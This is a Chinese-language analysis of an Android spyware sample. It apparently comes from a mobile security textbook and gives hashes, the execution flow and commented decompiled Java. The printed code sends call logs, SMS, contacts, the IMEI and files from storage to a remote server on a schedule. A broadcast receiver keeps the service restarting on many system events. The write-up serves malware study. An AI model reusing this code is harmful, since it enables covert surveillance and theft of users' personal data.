# 0x0 前言

## 0x0包名

com.example.first

## 0x1 样本情况

SHA-1 : b2eae33f6b3279ccbd0eaaa98184575d04425cca

MD5 : c7b8e65e5d04d5ffbc43ed7639a42a5f

## 0X2 加固

无

## 0x3 样本来源

《移动安全攻防进阶》15.3



# 0x1 执行路径

![image](https://github.com/user-attachments/assets/2ec1c851-ce1a-4a03-b5cc-9ed875db5418)



> 程序会在启动时检查和申请权限,之后进行登录操作,如果有历史登录记录也会直接跳过,程序中MainActivity执行的是程序宣传的功能,但在Login通过时会同时启动MainService,该服务会周期收集用户信息并发送给攻击者。

# 0x2 onStartCommand

```java
@Override
public int onStartCommand(Intent intent, int flags, int startId) {
    contextOfApplication = this; 
    // 启动Connection这个异步任务，它会在后台线程中执行一些操作，比如选择IP相关的逻辑(ip_chooser())
    new Connection().execute(new Object[0]); 
    // 通过循环不断检查ipselect的值,直到后台任务成功获取ipselect
    while (true) { 
        String str = this.ipselect;
        if (str!= null &&!str.isEmpty()) {
            break;
        }
    }
    // 根据选择好的IP地址（ipselect的值）构建上传相关的URL，用于后续向服务器上传数据等操作，拼接了特定的路径和参数（添加了imei相关参数）
    uploader_url = this.ipselect + "/FOXTROT/upload.php?imei="; 
    // 根据选择好的IP地址（ipselect的值）构建文件相关操作的URL，可能用于向服务器写入文件等操作，拼接了特定的路径
    file_url = this.ipselect + "/FOXTROT/write.php"; 
    // 根据选择好的IP地址（ipselect的值）构建信息相关操作的URL，可能用于向服务器注册或发送设备相关信息等操作，拼接了特定的路径
    info_url = this.ipselect + "/FOXTROT/register.php"; 
    // 调用scheduleJob方法进行任务调度相关配置，例如设置任务的周期性执行等（根据不同的Android系统版本有不同的实现逻辑）
    scheduleJob(); 
    // 获取设备的IMEI码，IM.getIMEI(this)应该是调用了自定义的IM类中的获取IMEI码的方法，获取到的IMEI码后续上传到服务器
    imsi = IM.getIMEI(this); 

    // 线程池,十分钟运行一次,获取并发送通话记录（CM.getCallsLogs获取通话记录数据）、短信列表（SM.getSMSList获取短信数据库）以及联系人信息（CL.getContacts获取联系人信息）等数据到服务器
    ScheduledExecutorService sExecutor = Executors.newScheduledThreadPool(5); 
    sExecutor.scheduleAtFixedRate(new Runnable() { 
        @Override
        public void run() {
            new SN().postfiledata(CM.getCallsLogs()); 
            new SN().postfiledata(SM.getSMSList()); 
            new SN().postfiledata(CL.getContacts());
        }
    }, 0L, 10L, TimeUnit.MINUTES);

    // 后台将context转为json发送
    Thread t2 = new Thread(new Runnable() { 
        @Override
        public void run() {
            try {
                
                new SN().postdata(info.getBasicInfos(MainService.contextOfApplication), "Info"); 
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    });
    t2.start(); 

    // 获取设备的IMEI码
    try {
        js.put("imei", imsi); 
    } catch (JSONException e) {
        e.printStackTrace();
    }
    // 后台循环一分钟一次,发送前面填充好的js对象（包含了IMEI码等信息）的数据到服务器,维持活跃(类似心跳包)
    ScheduledExecutorService scheduleTaskExecutor = Executors.newScheduledThreadPool(5); 
    scheduleTaskExecutor.scheduleAtFixedRate(new Runnable() { 
        @Override
        public void run() {
            new SN().postdata(MainService.js, "UpdateLastActiveTime"); 
        }
    }, 0L, 60L, TimeUnit.SECONDS);
    
    //后台循环一小时一次,扫描目录下的文件并发送到服务端
    ScheduledExecutorService sr = Executors.newScheduledThreadPool(5); 
    sr.scheduleAtFixedRate(new Runnable() { 
        @Override
        public void run() {
            //扫描目录下的文件并写入fsc
            SC.walkdir(Environment.getExternalStorageDirectory()); 
            // SU会上传在fsc中但不在fsu中的文件
            SU.ss(); 
        }
    }, 0L, 60L, TimeUnit.MINUTES);
    return 1; 
}
```

# 0x3 广播启动MainSvervice

```java
if ("android.intent.action.BOOT_COMPLETED".equals(intent.getAction())) {
    if (isNetworkAvailable()) {
        Intent pushIntent = new Intent(context, MainService.class);
        context.startService(pushIntent);
    }
} else if (intent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
    if (!isMyServiceRunning() && isNetworkAvailable()) {
        Context context2 = mContext;
        context2.startService(new Intent(context2, MainService.class));
    }
} else if (intent.getAction().equals("android.intent.action.SCREEN_OFF")) {
    if (!isMyServiceRunning() && isNetworkAvailable()) {
        Context context3 = mContext;
        context3.startService(new Intent(context3, MainService.class));
    }
} else if (intent.getAction().equals("android.intent.action.SCREEN_ON")) {
    if (!isMyServiceRunning() && isNetworkAvailable()) {
        Context context4 = mContext;
        context4.startService(new Intent(context4, MainService.class));
    }
} else if (intent.getAction().equals("android.intent.action.AIRPLANE_MODE")) {
    if (!isMyServiceRunning() && isNetworkAvailable()) {
        Context context5 = mContext;
        context5.startService(new Intent(context5, MainService.class));
    }
} else if (intent.getAction().equals("android.intent.action.BATTERY_LOW")) {
    if (!isMyServiceRunning() && isNetworkAvailable()) {
        Context context6 = mContext;
        context6.startService(new Intent(context6, MainService.class));
    }
} else if (intent.getAction().equals("android.intent.action.BATTERY_OKAY")) {
    if (!isMyServiceRunning() && isNetworkAvailable()) {
        Context context7 = mContext;
        context7.startService(new Intent(context7, MainService.class));
    }
} else if (intent.getAction().equals("android.intent.action.DATE_CHANGED")) {
    if (!isMyServiceRunning() && isNetworkAvailable()) {
        Context context8 = mContext;
        context8.startService(new Intent(context8, MainService.class));
    }
} else if (intent.getAction().equals("android.intent.action.ACTION_POWER_CONNECTED")) {
    if (!isMyServiceRunning() && isNetworkAvailable()) {
        Context context9 = mContext;
        context9.startService(new Intent(context9, MainService.class));
    }
} else if (intent.getAction().equals("android.intent.action.ACTION_POWER_DISCONNECTED")) {
    if (!isMyServiceRunning() && isNetworkAvailable()) {
        Context context10 = mContext;
        context10.startService(new Intent(context10, MainService.class));
    }
} else if (!isMyServiceRunning() && isNetworkAvailable()) {
    Context context11 = mContext;
    context11.startService(new Intent(context11, MainService.class));
}
```

`"android.intent.action.SCREEN_OFF"`（屏幕关闭）

`"android.intent.action.SCREEN_ON"`（屏幕开启）

`"android.intent.action.AIRPLANE_MODE"`（飞行模式相关）

`"android.intent.action.BATTERY_LOW"`（电量低）

`"android.intent.action.BATTERY_OKAY"`（电量恢复正常）

`"android.intent.action.DATE_CHANGED"`（日期改变）

`"android.intent.action.ACTION_POWER_CONNECTED"`（电源连接）

`"android.intent.action.ACTION_POWER_DISCONNECTED"`（电源断开）

在上述系统状态发生变化时并且服务未运行且网络连接正常时启动MainService服务。
